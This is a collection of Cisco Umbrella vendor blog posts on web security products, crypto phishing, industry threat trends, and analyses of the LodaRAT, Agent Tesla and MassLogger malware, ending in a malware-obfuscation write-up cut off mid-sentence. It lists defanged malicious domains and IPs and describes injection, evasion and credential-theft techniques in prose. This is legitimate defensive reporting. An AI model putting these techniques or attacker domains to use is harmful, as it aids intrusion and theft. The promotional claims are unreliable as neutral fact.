{"website": "Cisco-Umbrella", "title": "Radicati Corporate Web Security Market Quadrants Explained", "author": ["David Gormley"], "link": "https://umbrella.cisco.com/blog/radicati-corporate-web-security-market-quadrants-explained", "abstract": "Not all corporate web security players are created equal. But in a crowded market, how can you know which service will meet your needs best? Securing your employees and their devices, wherever and however they access the Internet, starts with minimizing the risk around selecting the right security provider. The Radicati Corporate Web Security Market Quadrant can give you a better idea of who brings what to the table. What the Radicati Corporate Web Security Market Quadrants mean Radicati Corporate Web Security Market Quadrants are designed to give you a snapshot of the top vendors within a specific market, at a certain point in time. Even though each market segment has its own MQ, all are composed of the same four quadrants. Top Players offer broad feature sets with a deep range of functionality. Given their propensity to innovate, they shape the direction of the market. Trail Blazers offer advanced, best-of-breed technology. Any deficits in features or functionality are made up by their potential to disrupt the market with new technology or delivery models. Specialists are made up of two types of players: emerging and established. The former are still developing their technology; the latter already have a satisfied, loyal customer base. Mature Players are long-established and have robust product offerings, but are slowing their innovation — either by design or because they’re being outpaced by the competition. The Corporate Web Security Market Quadrant A segment of the security market, the Corporate Web Security Market Quadrant includes software, appliances, and cloud-based services that protect corporate users and networks from Web-based malware. The solutions enable organizations to control employee Internet behavior and help prevent data loss. Each vendor is measured against 15 key features and capabilities — such as malware detection, URL filtering, and reporting, as well as support and service offerings — and is evaluated through two lenses: Functionality: Vendors that continue to advance their products’ features and functionality will move up the Y-axis. Strategic Vision: As a vendor grows both its understanding of the market and strategic direction, it will move to the right along the X-axis. Cisco Umbrella named a Top Player For 2021, Cisco has landed a spot within the Top Player square . Our leading cloud-delivered security service unifies firewall, secure web gateway, DNS-layer security, cloud access security broker (CASB), and threat intelligence — providing organizations around the world with a first line of defense against threats on the Internet, on any device and wherever users go. A superior, modern secure web gateway Part of what makes Cisco Umbrella a top choice when it comes to cloud security is our powerful secure web gateway (SWG) . It logs and inspects web traffic for complete visibility, URL and application controls, and protection against malware. Umbrella lets you use IPsec tunnels, PAC files, or proxy chaining to forward traffic to our cloud-based proxy to enforce acceptable use policies and block advanced threats. Key capabilities include URL-level logging and reporting; SSL traffic decryption and inspection; antivirus and advanced malware protection; threat grid sandboxing; integration with SD-WAN and AnyConnect for secure, direct Internet access; and automated tunnel failover to simplify deployment and maintenance. “Many organizations are moving away from the standard proxy due to the overhead of running and maintaining on premise proxy servers with PAC files or proxy specific agents. This way of deploying a proxy is antiquated and resource intensive. The Umbrella SWG nicely bridges the gap by providing the feature set of a full proxy with the ease of use and management you come to expect from Cisco Umbrella.” Axcess Financial Recently, AV-TEST, an independent security organization, conducted a study of threat efficacy among leading cloud security vendors. Cisco Umbrella received top marks across the board, with a 96.39% 1 total detection rate — the highest in the industry. Umbrella uncovers and blocks malicious domains, IPs, and URLs before they have the chance to attack your network. Additionally, Umbrella is powered by world-class Cisco Talos Intelligence Group — one of the largest commercial threat intelligence teams in the world, comprised of researchers, analysts, and engineers. These teams are supported by unrivaled visibility and sophisticated systems to create accurate, rapid, and actionable threat intelligence for Cisco customers, products, and services. Talos defends Cisco customers against known and emerging threats, discovers new vulnerabilities in common software, and interdicts threats in the wild before they can further harm the internet at large. Cisco SecureX, included with all Umbrella subscriptions, helps you accelerate threat investigation and automates remediation by unifying Umbrella’s activity and event data with the Cisco Security portfolio and a wide range of third-party solutions. Together, with unified visibility, faster response times, and a reduction in manual workflows, SecureX and Cisco Umbrella reduce the time, money, and resources it takes to investigate and remediate incidents. Cisco Umbrella — a key component of Cisco’s secure access service edge (SASE) architecture — integrates multiple standalone security services into a single cloud-native solution. By unifying security functions, Cisco Umbrella helps reduce the resources required for deployment, configuration, and integration. It’s fast to deploy and easy to configure across locations and users, whether they’re on- or off-network. Umbrella reduces complexity, simplifies management and incident investigation, and empowers you to apply consistent protection — all from a single console. And, by delivering this functionality from the cloud, you can easily scale to meet the needs of a remote and roaming workforce. Take a deeper dive To read more about what makes us a Top Player, to go deeper into the details, and to see which other players landed and where, read the Radicati Corporate Web Security Market Quadrant report . 1 DNS-Layer Protection & Secure Web Gateway Security Efficacy Test", "date": "2021-05-11"},
{"website": "Cisco-Umbrella", "title": "Cloud security for manufacturing – gaining control and visibility", "author": ["Paul D'Cruz"], "link": "https://umbrella.cisco.com/blog/cloud-security-for-manufacturing-gaining-control-and-visibility", "abstract": "I recently had the pleasure of sitting down for ‘coffee’ with Claudio Bolla, Global Information Security Director at INEOS to learn how he’s managing cloud manufacturing security during the pandemic. As a large chemicals company with 26,000 employees, INEOS operates 36 different business units with 196 locations around the world. Their businesses span oil and gas, energy, and chemical production. INEOS manufactures chemicals that have been used to develop the vaccine, hand sanitizer, face masks, the plastic used in aeroplane parts, just to name a few things! I knew that INEOS did quite a bit of M&A and because of this, finds itself with many disparate businesses, such as INEOS Automotive which is building a 4×4 vehicle (inspired by the Land Rover Defender). But what I didn’t know was that INEOS has made a foray into the beautiful game of football! Turns out sports is one of INEOS’ key pillars. This started with the acquisition of Lausanne Football Club in Switzerland, followed by the Nice Football Club in France. On the philanthropic side, they’ve even developed their own football clubs in underdeveloped countries to improve the social well-being of youth. When the pandemic hit, many companies sent all or the majority of their employees home to work remotely. However, because INEOS had physical assets with production sites, it wasn’t just a matter of telling everyone to work from home. They had to keep their manufacturing plants running! And it was critical to do so because they were making products that are used to fight the pandemic. They moved from a primarily office-based, production-site approach to a hybrid situation. This transition introduced much complexity, especially given the number of business units, differing types of products, and challenges related to maintaining a secure manufacturing environment in the cloud. Prior to the pandemic, INEOS turned to Cisco Umbrella to migrate all of their divisions to a single provider for DNS coverage. Umbrella also gives them the ability to let each business unit decide if they want different types of policies for different types of users. With so many contrasting businesses, the security controls for each BU can vary quite a bit. Since they had already deployed Umbrella successfully, when the pandemic hit, INEOS was able to quickly secure remote manufacturing workers using the roaming client: they went from 500 users connecting per day to over 7,000 users in one weekend! In the talk, Claudio reveals how “an unexpected benefit of Umbrella was App Discovery ,” which allows them to uncover cloud storage and reduce risk. Umbrella’s CASB functionality allows customers to gain control and visibility of cloud application and service usage across their entire network, and block risky apps to improve security. Claudio shared many, many intriguing insights on how to give employees the right level of security at the right time (yes, there is such a thing as too many security controls!) Hear directly from Claudio Bolla in this short highlights video: Click to watch the full Cisco Umbrella Coffee Hour with INEOS .", "date": "2021-05-04"},
{"website": "Cisco-Umbrella", "title": "Keeping your crypto safe as cryptocurrency phishing attacks soar", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/keeping-your-crypto-safe-as-cryptocurrency-phishing-attacks-soar", "abstract": "With cryptocurrency reaching all-time highs (more than doubling since the start of the year), many people have looked to it as a form of investment. But as investors turn their attention to crypto, so do malicious actors. The market is set-up for attackers to cash in. As the price of bitcoin (BTC) and other cryptocurrencies go high, we observe an increase in all types of attacks targeting crypto users. In contrast with common banking operations, cryptocurrency transactions are irreversible. When cryptocurrency is sent to a third party, the payment cannot be stopped or reversed. We covered a phishing scheme which left thousands of customers without their funds before and today we want to share what changes we observed within the past few months in the cryptocurrency threat landscape. While phishing became less prevalent and less successful, we still track actors targeting cryptocurrency exchanges and trading platforms. Some attempts are obvious and easy to spot, others are more sophisticated. These attacks use certificates which are either obtained by using hosting services such as Cloudflare, or obtained from an actual certificate authority. Wildcard SSL certificate from CloudFlare used by phishing domain SSL certificate from CA used by phishing domain How attackers target Blockchain Malicious actors which target Blockchain.com still utilize homograph attacks. These attacks are based on standards of the modern internet that allow the creation (and display in web browsers) of URLs with characters from various language sets (with non-ASCII letters). In the example below the real URL is login.xn--blockchin-c3a[.]com, but when rendered by the browser looks relatively legitimate. The issue is worse on mobile devices where the URL is not always displayed in full. These fraudulent websites are distributed through a variety of methods including email, SMS text messages, social media, and search-engine advertisements. On average, such campaigns last for three to seven days and affect 20 to 40 users daily. Cryptocurrency users are not the only ones in danger of their funds being stolen. Exchanges themselves can become victims of successful hacker attacks . Uh-oh, what’s in your wallet? With that in mind, more cryptocurrency owners turn towards cold storage options or wallets stored on their own computers. However, while you might think that you’ve made your crypto currency more secure, quite the opposite can happen. Malicious actors target wallets and their owners just as often as they target trading platforms or exchanges. Malicious wallets make their way into popular appstores and online by using fraudulent websites and trojanized binaries. Here is an example of such an attack: Malicious domain hosting trojanized wallet binaries What makes things worse is that both the malicious binary and the legitimate one are detected as malicious by AV engines. Malicious binary Hash: 19388773fb5ac96ca0ea611bd10e71892c820effb0a70ee414faab03d5a2444b Legitimate binary Attacker controlled server has consistent traffic peaking at 1.5k queries If the user has such a wallet installed, all data including passphrase and private keys are exfiltrated to a server controlled by the attacker, who will transfer any available funds. Sometimes fraudulent wallets pose as an update to existing versions. In this case the user is transferred to an online webpage which asks to update or import previously generated wallets. Malicious wallet asking for user secrets However, the end goal of the attacker is the same – to recreate the wallet with user secrets and steal his funds. Other targeted hardware wallets include Ledger , Trezor and Mycelium . Overall traffic to malicious cryptocurrency domains over last 28 days (excluding C&C traffic) Tips to keeping your cryptocurrency safe So if you’re a seasoned cryptoveteran or a new crypto enthusiast, you have to pay extreme caution while trading or storing your cryptocurrency. Here are a few key tips to keep your organization protected on every front: Be wary of common identifiers of phishing domains such as typos, broken links, and unusual contact information. Avoid clicking any links which come in the emails, sms, or social media. Be familiar with basic security such as: Two-factor authentication What suspicious files look like How to evaluate wallet apps or software. The more widely a cryptocurrency is used, the more malicious actors they will attract. Cisco Umbrella helps protect against malicious cryptomining According to recent research using Cisco Umbrella global cloud architecture , 69% of Cisco Umbrella customers see cryptomining traffic on a daily basis. Cisco Umbrella resolves approximately 620 billion DNS requests daily — far more than any other security vendor. By analyzing and learning from internet activity patterns, Cisco Umbrella automatically uncovers current and emerging threats. Cisco Umbrella customers can detect, block, and protect against unwanted cryptomining in their environments, at no extra charge. IOCs: electrum-official[.]org epayment-paxful[.]com paxfuldeals[.]com option-paxful[.]com ppaxful[.]com paxful-paid-offer[.]com buybitcoinonline-paxful[.]com legalpayment-paxful[.]com gateway-paxful[.]com ledger-live[.]co ledgertoolkit[.]com ledger-web[.]us ledger[.]com[.]device[.]id[.]756728[.]app wallet-login[.]app ledger[.]com-authorization-login[.]app ledger[.]com-verification-login[.]app ledger[.]com-activity-login[.]app ledger[.]com-login-secure[.]app ledger[.]com-account-login[.]app ledger[.]com-login-wallet[.]app ledger[.]com[.]login-account[.]app ledger[.]com[.]login-verification[.]app ledger[.]com-login-activity[.]app coinbase[.]com[.]connect[.]id73737[.]app usa-ledger[.]com ltc-electrum[.]org coinbaseprologin-pro[.]com electrumupdate[.]cc electrumservice[.]com electrum[.]download electrum-bch[.]com exodus-login[‘.]com logins-kraken-in[‘.]com kraken-app[.]com kraken-accounts-fr[.]com kraken-balances-us[.]com exoduswalletweb[.]live exodusmainwallets[.]live exoduswalletsio[.]live com-account-login[.]app com-activity-login[.]app com-authorization-login[.]app com-login-account[.]app com-login-activity[.]app com-login-secure[.]app com-login-wallet[.]app com-verification-login[.]app poloniex-asset[.]com kraken-logins-fi[.]com xn--blockchin-c3a[.]com Xn–coinbse-9wa[.]com", "date": "2021-04-27"},
{"website": "Cisco-Umbrella", "title": "Making ESG’s 2021 Network Security Predictions Actionable", "author": ["Nicholas Consolo"], "link": "https://umbrella.cisco.com/blog/making-esgs-2021-network-security-predictions-actionable", "abstract": "A new year brings a new wave of predictions for how companies will be shaping their network security architectures in 2021. Could anyone have predicted 2020 was going to be the year that changed the way companies did business, managed networks, and secured users? Much of these changes happened in a moment’s notice and held true into the following year. The pivot toward remote work accelerated migration to the cloud and the way companies are approaching network security for years to come. With the workforce becoming even more distributed than ever before, the demand for anywhere, anytime access to applications and resources in the cloud grows. While some predictions may become a reality sooner than others, 2021 is an important year for companies to evaluate their network security strategy moving forward and what that architecture should look like to carry out key business goals efficiently. Enterprise Strategy Group (ESG) recently published a brief discussing what they believe 2021 has in store for the evolution in network security. Many of their predictions brought secure access service edge (SASE) to the forefront of the conversation as the traditional network perimeter continues to dissipate with the increase in remote work and cloud adoption. Let’s make sense of some of these predictions and how you can incorporate them into your organization’s network security strategy. Actionable Insights on Improving Network Security Remote worker and SD-WAN support continue to shape the industry As we progress through 2021, more organizations will be opening their offices to employees while continuing to support remote work. Having the ability to offer employees a secure and consistent experience no matter where they wish to work, will continue to be a priority for many organizations. Seeking a vendor who can deliver this secure and reliable experience for both branch and remote users, while demonstrating success in both networking and security solutions, will help your organization navigate the journey to SASE and reduce unnecessary obstacles along the way. Hybrid environments become mainstream with journey to cloud adoption The industry talks a lot about the cloud and SASE, but what about the appliance market? After all, many of today’s network security solutions are hardware appliances deployed on-premises. The shift to cloud has accelerated over the last year, but it will take time for organizations to fully transition to this model. Many organizations will blend their current investments with cloud solutions rather than undertake a full rip-and-replace approach. Moving to the cloud is a journey, not a sprint. Partnering with a vendor who can help ease your transition to the cloud, by working with the solutions you currently have, will help maximize your existing investments and provide an improved level of performance and protection without exceeding your budget. Vendors look for acquisitions to cover SASE use cases Many vendors missing core SASE components are looking to build out their network security solution set by acquiring vendors with separate point products. ESG predicts there could be a billion-dollar SASE acquisition this year. Although these acquisitions will help larger organizations achieve a single vendor SASE approach, it will likely take years to fully integrate the solutions to a point where customers are seeing a return on investment. SASE provides the most value to customers when integration is seamless across not only the core components, but other solutions as desired. Decision makers should choose a vendor who is equipped to support their vision for SASE now and into the future with a broad and integrated portfolio. Your SASE journey starts with Cisco Your organization needs a partner who can support you anywhere in your SASE journey now and in the future. A partner that has both networking and security at the foundation of its DNA. Cisco is that partner who will help you through your cloud transition with ease and empower you to do it your way. Cisco’s core SASE components are integrated and ready to deploy today, so you can start solving core SASE use cases immediately. Next steps Read the full report – ESG Networking Security Predictions 2021 Learn more about Cisco’s SASE architecture Start a 14-day Umbrella Free Trial", "date": "2021-04-20"},
{"website": "Cisco-Umbrella", "title": "Most common cybersecurity threats of 2021 broken down by industry", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/most-common-cybersecurity-threats-of-2021-broken-down-by-industry", "abstract": "In today’s modern threat landscape, it’s hard to properly allocate resources where they’re needed most. Is it cryptomining, ransomware, phishing or some new threat that no one has faced before? It can be a little (or let’s be honest here), a lot overwhelming. As we covered in Part 1 of the Threat Trends series on DNS Security, understanding the larger trends can help, especially when dealing with the most common threat types. To help you tackle the threats most likely to occur within your industry, in Part 2 of the Threat Trends series, we focus on the top threats facing specific industries. Author Ben Nahorney compares yearly totals of DNS traffic to malicious sites by industry for the year 2020, occasionally drilling down to the monthly level. Nahorney provides a window into which categories of threats generate the most traffic for various organizations in the technology, financial services, healthcare, manufacturing, higher education and government industries. Research Highlights The technology sector saw far more cryptomining traffic than any other industry, and the second highest level of ransomware related traffic, primarily driven by attacks Sodinobiki and Ryuk . Financial services saw the highest levels of malicious DNS traffic and information stealing threats. The scope of malicious traffic speaks to how enticing a target this area is to bad actors. Healthcare saw more trojans than any industry while still experiencing its fair share of droppers and ransomware. Most trojan-based activity came from Emotet ; healthcare organizations were hit particularly hard by this malware in 2020. Manufacturing showed high levels of cryptomining and almost as much ransomware traffic as the next two closest industries combined (technology and healthcare). Higher education faced a fairly even distribution for the top four threat trends. The data used to uncover these trends come from Cisco Umbrella, our cloud delivered security service that includes DNS security, secure web gateway, firewall, and cloud access security broker (CASB) functionality, and threat intelligence. Umbrella combines multiple security functions into one solution, so you can extend protection to devices, remote users, and distributed locations anywhere. Umbrella is the easiest way to effectively protect your users everywhere in minutes. Methodology Every day, Cisco Umbrella’s global cloud architecture processes more than 620 billion internet requests from across 190 countries. This real time DNS data is further enriched with data from both private feeds and a handful of public ones. With such a massive and diverse data set, our threat analysis can uncover patterns that signal malicious behavior. This analysis is based on an aggregated data set of overall percentages and month-on-month trends, by the number of endpoints that have attempted to visit certain websites flagged as malicious and the total number of times malicious sites were visited. Together, they give us a unique perspective on global DNS traffic, which helps us identify trends and defend against potential threats. Interested in learning more about threat trends specific to your industry? Check out Part 2 of our threat blog series .", "date": "2021-04-13"},
{"website": "Cisco-Umbrella", "title": "Trojans, information stealer feature complex risks", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/cybersecurity-threat-spotlight-trojans-information-stealer-feature-complex-risks", "abstract": "Welcome to the first monthly edition of the Cisco Umbrella Threat Spotlight, which is produced by our cybersecurity threat analysis team. This team supports the collection, analysis and distribution of threat intelligence from the Cisco global cloud architecture . The Cisco Umbrella security researchers take mathematical concepts and find new ways to apply them to security data — helping us uncover threats before attacks even launch. They leverage advanced data mining techniques, machine learning and behavioral models, coupled with security domain expertise to identify threats and protect our customers. We hope this threat research will be helpful to Umbrella customers in identifying and stopping cybersecurity threats as they arise. This month, we’re examining a remote access trojan (RAT), another trojan that frequently works with the RAT, and an information stealer. While each possesses unique features and characteristics, they are good examples of the ongoing trend toward complex, multi-staged cyber attacks. Threat Name: LodaRAT Threat Type: RAT (Remote Access Trojan) Actor: LodaRAT – Kasablanka Group Delivery and Exfiltration: Description: Loda is a remote access trojan (RAT) for Windows and Android systems. Loda campaigns use malspam and websites hosting malicious documents to begin a multi-stage infection chain, which ultimately serves a malicious file to install LodaRAT on targeted systems. While the main purpose of this RAT is to steal usernames, passwords, and cookies saved within browsers, it also has keylogging, sound recording, and screenshot abilities. LodaRAT Spotlight: In the latest campaign, the malicious document exploits CVE-2017-11882 to download and run the SCT file. Once the exploit is triggered, an SCT file initiates download of the LodaRAT binary. Apart from data stealing abilities the malware contains a command- and script-running capability, which provides the malware flexibility to perform a wide range of tasks. Another notable new command is “Sound|” which uses the BASS audio library to capture audio from a connected microphone. The C2 hostname and port are both hardcoded in the sample in plain text. This new campaign targets Bangladeshi users of Windows and Android systems. The fact that the threat group has moved into hybrid campaigns targeting Windows and Android shows a group that is thriving and evolving. Giving that there are indications that the group using LodaRAT is looking for direct financial gain (there is no related ransomware or banking activity), organizations and individuals should be aware of this threat group. Target geolocations: US, Costa Rica, Brazil, Argentina, India Target data: Credentials, Cookies from browsers, Stored information Target businesses: Any Exploits: CVE-2017-11882 Mitre Att&ck, LodaRAT: Initial access: Spearphishing Attachment Persistence: Registry Run Keys / Startup Folder , Scheduled Task Evasion: File and Directory Permissions Modification , Obfuscated Files or Information Collection: Audio Capture , Automated Collection , Clipboard Data , Screen Capture , Video Capture Exfiltration : Data Obfuscation , Exfiltration over Web Service References: Talos blog – LodaRAT IOCs: Domains: info.v-pn[.]co lap-top[.]xyz av24[.]co bdpolice[.]co isiamibankbd[.]com bangladesh-bank[.]com zep0de[.]com bracbank[.]info IPs: 160.178.220[.]194 194.5.98[.]55 107.172.30[.]213 For additional information: Talos blog – LodaRAT How to stop LodaRAT: Cisco Umbrella can detect and block a LodaRAT cyber attack. A checklist of Cisco products that can detect and block this cybersecurity threat is below. Threat Name: Agent Tesla Threat Type: Trojan Actor: Agent Tesla – Raticate Delivery and Exfiltration: Description: Trojan first observed in 2014, Agent Tesla is marked by a strong support presence from its developers. It was distributed by GuLoader through phishing attachments posing as information about the COVID-19 outbreak. A variety of attackers use the malware to steal user credentials and other information from victims through screenshots, keyboard logging, and clipboard capture. Because the malware’s compiler hard-codes operator-specific variables at build time, Agent Tesla behavior can vary widely—and the malware continues to evolve. Agent Tesla Spotlight: In the latest campaign, Agent Tesla was delivered as malicious attachments in emails. The malware uses a number of methods to defeat sandbox and static analysis and evade endpoint detection. These methods include the use of packers to obfuscate code, and the use of components hosted legitimate websites. The infection process consists of several stages, where malware attempts to overwrite code in Microsoft’s AMSI, and uses Hastebin to download an obfuscated loader which installs the final payload.  New versions of Agent Tesla can use HTTP, SMTP, FTP, and Telegram chat protocol for communication. When installed the RAT archives persistence, fingerprints infected machines and steals credentials. Other capabilities include screenshot exfiltration and keystroke capture. Type: Trojan Target geolocations: Any Target data: Credentials, Browser Cookies, System Fingerprints Target businesses: Any Mitre Att&ck, Agent Tesla: Initial access: Spearphishing Attachment Persistence: Registry Run Keys / Startup Folder Evasion: Impair Defenses: Disable or Modify Tools , Virtualization/Sandbox Evasion: System Checks , Virtualization/Sandbox Evasion: Time Based Evasion Collection: Automated Collection , Clipboard Data , Screen Capture Exfiltration: Exfiltration over Web Service References: Agent Tesla IOCs: Domains: 3ptechnik[.]xyz 89gospel[.]com arles-cz[.]co delcoronascardigli[.]xyz itrader-germany[.]de orator[.]net p0lybrands[.]com proxyfreaks[.]com qxq.ddns[.]net sciencepub123[.]com aruscomext[.]com chemweb[.]xyz cleannharbor[.]com crmsynergies[.]xyz cumjtas[.]com energstylgroup[.]com protecclab[.]com scrablex[.]com top-semi[.]xyz perfumela[.]com How to stop Agent Tesla: Cisco Umbrella can detect and block an Agent Tesla cyber attack. A checklist of Cisco products that can detect and block this cybersecurity threat is below. Threat Name: Masslogger Threat Type: Information Stealer Actor: MassLogger Delivery and Exfiltration: Description: MassLogger is an Information Stealer. It is mainly distributed by delivery mechanisms which download encrypted payloads such as GuLoader. The C2 carrier protocol depends on the sample’s configuration, but it can send the results over SMTP and/or FTP to its control server. The creator of MassLogger, known as NYANxCAT, is responsible for several other well-known and prolific RATs, including LimeRAT, AsyncRAT, and other RAT variants. MassLogger is being improved consistently over time. Updates add new targets for its credential stealing functionality and include measures taken that would reduce automated detection. Other functions include searching for files with a specific file extension and exfiltrating them. MassLogger Spotlight: Although operations of the Masslogger trojan have been previously documented, Cisco Talos found the new campaign notable for using the compiled HTML file format to start the infection chain. This file format is typically used for Windows Help files, but it can also contain active script components, in this case JavaScript, which launches the malware’s processes. In case of commodity spyware such as Masslogger, it is the infection chain and contextual information that distinguish the individual actors behind each campaign. This infection chain seems to focus on business users, with email being the infection vector. The email contains a RAR attachment with a compiled HTML (.chm) attachment. The rest of the chain is split between JavaScript, PowerShell and .NET. The email is written in the language of the targeted recipient’s top-level domain. The attachment file name for the latest campaign is chosen according to the email subject, with possible random strings prepended. When the user opens the attachment with the default application the chain of exploitation is launched. It results in MassLogger malware being installed on the workstation. This version of Masslogger contains the functionality to target and retrieve credentials from the following applications: Pidgin messenger client FileZilla FTP client Discord NordVPN Outlook FoxMail Thunderbird FireFox QQ Browser Chromium based browsers (Chrome, Chromium, Edge, Opera, Brave) Stolen data can be exfiltrated through SMTP, FTP or HTTP protocols. In this case, the exfiltration was conducted over FTP. Target geolocations: Turkey, Latvia, Italy, Bulgaria, Lithuania, Hungary, Estonia, Romania, Spain Target data: Credentials from Web Browsers, Local Data Target businesses: Any Exploits: N/A Mitre Att&ck, MassLogger: Initial access: Spearphishing Attachment Persistence: Registry Run Keys / Startup Folder Evasion: Deobfuscate/Decode Files or Information , Virtualization/Sandbox Evasion Execution: Command and Scripting Interpreter: JavaScript/JScript Collection: Clipboard Data , Input Capture Discovery: System Information Discovery , Software Discovery Credential Access: Credentials from Password Stores: Credentials from Web Browsers , Input Capture: Keylogging Exfiltration: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol References: Talos Blog – MassLogger IOCs: Domains: sinetcol[.]co becasmedikal[.]com[.]tr risu[.]fi topometria.com[.]cy bouinteriorismo[.]com optovision[.]gr hotelaretes[.]gr jetfleet24[.]com med-star[.]gr For additional information: Talos blog – MassLogger How to stop MassLogger: Cisco Umbrella can detect and block a MassLogger cyber attack. A checklist of Cisco products that can detect and block this cybersecurity threat is below.", "date": "2021-04-08"},
{"website": "Cisco-Umbrella", "title": "DNS Security – Your New Secret Weapon in The Fight Against Cybercrime", "author": ["Rachel Ackerly"], "link": "https://umbrella.cisco.com/blog/dns-security-your-new-secret-weapon-in-your-fight-against-cybercrime", "abstract": "It’s time to use the internet to your security advantage. Did you know more than 91% of malware uses DNS to gain command and control, exfiltrate data, or redirect web traffic? But when internet requests are resolved by a recursive DNS service, they become the perfect place to check for and block malicious or inappropriate domains and IPs. DNS is one of the most valuable sources of data within an organization. It should be mined regularly and cross-referenced against threat intelligence. It’s easier to do than you might think. Security teams that are not monitoring DNS for indications of compromise are missing an important opportunity. DNS Firewalls Could Prevent Billions in Losses to Cybercrime Don’t believe us? New analysis shows widespread DNS protection could save organizations as much as $200 billion in losses every year. Check out the full report  “ The Economic Value of DNS Security ,” recently published by the Global Cyber Alliance (GCA). According to their findings, DNS firewalls could prevent between $19 billion and $37 billion in annual losses in the US and between $150 billion and $200 billion in losses globally. That’s a lot of bang for your buck. If organizations around the globe were to make this simple addition to their security stack, the savings could add up into billions of dollars.  Translation: an easy way to prevent one-third of total losses due to cybercrime. Do you know the ins and outs of how DNS can be used to secure your users?  Attend our next live demo to see Cisco Umbrella in action . About Cisco Umbrella Cisco Umbrella uses the internet’s infrastructure to stop threats over all ports and protocols before it reaches your endpoints or network. Using statistical and machine learning models to uncover both known and emerging threats, Umbrella proactively blocks connections to malicious destinations at the DNS and IP layers. And because DNS is a protocol used by all devices that connect to the internet, you simply point your DNS to the Umbrella global network, and any device that joins your network is protected. So when your users roam, your network stays secure. *Source: https://umbrella.cisco.com/blog/cisco-security-report-more-orgs-should-be-monitoring-dns", "date": "2019-06-19"},
{"website": "Cisco-Umbrella", "title": "Obfuscation: The Abracadabra of Malware Authors", "author": ["Shyam Sundar Ramaswami", "Sreenidhi Ramadurgam", "Sneha Shekar"], "link": "https://umbrella.cisco.com/blog/obfuscation-the-abracadabra-of-malware-authors", "abstract": "When analyzing suspicious domains, Dropbox is one of the brands that is usually under scrutiny. Typically, we are looking at a phishing page that is pretending to be Dropbox in order to steal user credentials. Other times, as with most cloud content hosting sites, we find shared links hosted on Dropbox that lead to a malicious file. In this blog post, as members of the Security Research Analyst team, we’re going to run through an analysis we did of a file that was hosted on a Dropbox shared link that turned out to be using some pretty interesting obfuscation techniques in order to hide the real intentions of the file. The file was initially received as a zip archive. Inside was what appeared to be a .scr file, or a screensaver file. A New Screensaver We started out doing some typical forensic steps by running the file against pestr in REMnux. From this, we were able to determine that it contains a couple of .exe and .vbs files. This led us to the conclusion that the file wasn’t packed. The file was then run through CFF Explorer to see if it was a screensaver or just posing as one. The PE header starts with MZ which indicates that it is an executable. The file was probably renamed from .exe to .scr to either evade security solutions or to distribute it as a free screensaver. The .scr file was unzipped and it had a whopping 59 files within it. When all the files from the unzipped scr file were inspected, each of them were of various file types. We then realized that those were not the real extensions, but just another trick to evade analysis. Most of these were actually just text files. Let’s start with ‘csn.vbs’. When dealing with malware, vbs files which are usually launched through macros can contain malicious code that furthers the infection process usually by contacting a domain or IP address to download additional malware. Upon opening the file, it was observed that the whole file was filled with Chinese text.With further inspection we realized that this was merely used as an obfuscation method to hide the actual code, thus making it harder to detect. After filtering out all the Chinese text, we obtained the function from this file. The vb script calls a file named agj.exe and ‘gjm=loo’ is passed as a parameter to it. Our next step was to inspect these two files. Would you like some more files? When analyzing agj.exe, we went back to the parent folder to look for it, and realized the file was not present in the set of 59 files. Usually in such cases, URLs will later be contacted through a powershell command when another file is executed in order to download additional files. However, in this analysis we didn’t observe that behavior. So where was the file? After enabling the Windows OS to ‘show hidden files’, voila! We found agj.exe. The malware author was using another technique to hide their tracks. We then started inspecting gjm=loo. We looked into the properties of the file, and noticed that the file size was 215 MB. But the original scr file was only 1.25 MB. The malware authors must have used some compression techniques to compress the 59 files into one. The smaller file size makes the file easier to distribute and thus infect more victims. When inspecting the ‘gjm=loo’ file, we again saw that it was filled with Chinese text. However, this time the file was too large that it crashed every possible GUI editor we tried. Manually removing the Chinese characters like the previous time was out of the question since this contained more than 2,045,440 lines. A python regex script was made to try to handle this, but also crashed. We opened it in powershell and found out that a set of characters repeated every 9,200 lines. Every command was also preceded by ‘#ce’. We made use of this to filter out only the actual code. Upon inspecting the code, we noticed that the ‘gjm=loo’ file refers to another file, ‘mgi.cpl’. The .cpl is a control panel item. Again, it wasn’t actually a cpl file, but a text file in which the extension was renamed. A lot of the code in the ‘gjm=loo’ file were AutoIt functions. AutoIt is a scripting language designed to automate functions in the Windows UI as well as for use with general scripting tasks. AutoIt in this case is probably used to prevent antivirus systems from recognizing the malware’s signature. The code is compiled and run as a valid AutoIt process with the malicious payload loaded into an AutoIt process memory space. Malware authors leverage and abuse trusted processes to hide and masquerade their malware. The ‘gjm=loo’ file has a slew of global variables and has the typical traits of malware, using suspicious functions and variables. We initially thought that these may be some address locations that the variables point to. However, digging deeper we realized that these are in fact keycode constants. Keycode constants /values can be used anywhere in code in place of the actual values. For instance, the first variable declared equals 0x1. This is a keycode constant for a left mouse button. So when this variable is invoked somewhere in the program, it causes the left button to be clicked. Some of these global variables also pointed to cryptographic algorithm identifiers . For example, 0x00008001 is the MD2 hashing algorithm. All these cryptographic techniques are used at a later stage by the attacker. There were more than 12 different functions here, all of which were called by one main function. When we skimmed through the code, VMwaretray.exe, VBoxService.exe and other such keywords caught our attention immediately. These are traits of typical sandbox evading malware. If the malware figures out that it is executing in a virtual machine, it stops execution immediately or exhibits a fake behavior. The code also had a function to ensure persistence. This particular sample achieved persistence by writing itself to the registry. The adversary is trying to maintain their foothold. This is seen below. The abuse of WScript has massively increased over the years. Malware authors make extensive use of this due to its ability to interpret the .js and .vbs files. This particular malware uses WScript to invoke the vb script. The actual trojan DLL was made by the following function. The function makes a call to the file ‘mgi.cpl’ and extracts the trojan code in between the strings “Troj” and “ FinTroj”. The string is just an encrypted text of 484,000 length. Various encryption techniques such as RC2, Triple DES, SHA, etc were used to encode the trojan code. After encoding the whole code, the malware author reversed the string and placed it in the file. When this string is invoked in the main program, the string is first reversed and then passed to a function that creates a DLL. The DLL injection The DLL injection is performed by inserting code into the running process. The adversary is trying to gain higher-level permissions. Privilege escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. This is done by attaching to a process and allocating some memory within the process for the malicious code. This memory allocation is done by a function called VirtualAllocEx(). The code is then inserted in the existing process. This is taken care of by the WriteProcessMemory() function. The base address of the malicious code is noted so that it can be called whenever required. This is usually done using the thread invocation mode so that it may go unnoticed. The malware may inject its own malicious code into the DLL. So far, we have done only static analysis on the sample. When we dynamically executed it, we figured out the process 